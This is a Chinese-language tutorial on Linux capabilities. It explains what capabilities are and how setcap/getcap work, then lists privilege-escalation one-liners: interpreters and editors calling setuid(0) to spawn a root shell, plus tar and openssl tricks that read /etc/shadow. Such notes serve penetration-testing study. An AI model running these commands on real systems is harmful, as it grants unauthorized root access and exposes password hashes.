<span style="font-size: 40px; font-weight: bold;">Capabilities 提权</span>

<div style="text-align: right;">

date: "2023-09-03"

</div>

# 1. 什么是 Capabilities 提权

"Capabilities 提权"（也称为"Linux 能力提权"或"Linux 能力升级"）是指在 Linux 操作系统中，允许普通用户或进程获得一些系统权限或特权的一种机制。Linux 的能力（capabilities）是一种细粒度的权限系统，允许系统管理员将一些特定的权限分配给普通用户或进程，而不需要赋予它们完整的超级用户（root）权限。

Capabilities 提权的目的是减少系统中普通用户或进程所需的特权级别，以提高系统的安全性。通过细粒度的权限控制，系统管理员可以更精确地管理哪些权限可以被哪些用户或进程访问，而不必给予完整的 root 权限。
一些例子包括：

1. `CAP_NET_ADMIN`：允许进程配置网络设备。这使得普通用户或进程可以管理网络接口而不需要完整的 root 权限。
2. `CAP_DAC_OVERRIDE`：允许进程忽略文件的 DAC（Discretionary Access Control）权限。这使得进程可以访问其他用户的文件，而不需要 root 权限。
3. `CAP_SYS_ADMIN`：允许进程执行各种系统管理任务，如挂载文件系统和设置系统时间。这使得普通用户可以执行某些系统管理任务。
4. `CAP_SYS_PTRACE`：允许进程使用 ptrace 来调试其他进程。这使得调试工具和性能分析工具可以在非特权用户下运行。

Capabilities 提权是一种强大的安全特性，但也需要慎重使用。错误配置的 capabilities 可能导致安全漏洞，因此系统管理员需要谨慎管理和分配 capabilities，确保系统的安全性和完整性。

# 2. Capabilities 原理

Capabilities 机制是在 Linux 内核 2.2 之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。
这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。

# 3. 配置 Capabilities-设置 Capability

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/bin/filename
```

## 3.1 查看 Capability

查看所有

```bash
getcap -r / 2>/dev/null
```

查看指定的程序

```bash
getcap /usr/bin/filename
```

## 3.2 删除 Capability

```bash
setcap -r /usr/bin/filename
```

# 4. 利用 Capabilitu 提权

## 4.1 gdb 命令提权

```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

![image.png](../../../../images/Linux-Tiquan-38.png)

提权失败，不知道是不是由于版本的原因导致的。

## 4.2 perl 命令提权

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

![image.png](../../../../images/Linux-Tiquan-39.png)

提权失败

## 4.3 php 命令提权

php5.4 版本没有`posix_setuid()` 函数，需要 php 版本为 7.x

```bash
php -r "posix_setuid(0); system('/bin/sh');"
```

## 4.4 python 命令提权

```bash
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## 4.5 ruby 命令提权

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

## 4.6 rvim 命令提权

```bash
rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## 4.7 vim 命令提权

```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

![image.png](../../../../images/Linux-Tiquan-40.png)

提权失败

## 4.8 tar 命令提权

`cap_dac_read_search`可以绕过文件的读权限检查以及目录的读/执行权限的检查，利用此特性我们可以读取系统中的敏感信息。

```bash
# 绕过权限检查即可成功创建压缩文件
tar cvf shadow.tar /etc/shadow

# 解压缩
tar -xvf shadow.tar

# 进入解压缩的目录
cd etc

# 赋予读权限
chmod +r shadow

# 查看shadow文件的内容
5. cat shadow | grep root
```

## 4.9 openssl 命令提权

当 openssl 的 capability 被设置为空时，可以尝试读取敏感文件

```bash
# 使用openssl生成证书
cd /tmp
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# 启动web服务器，监听1337端口
cd /
openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP

# 访问本机的web服务，读取/etc/shadow文件
curl -k "https://127.0.0.1:1337/etc/shadow"
```
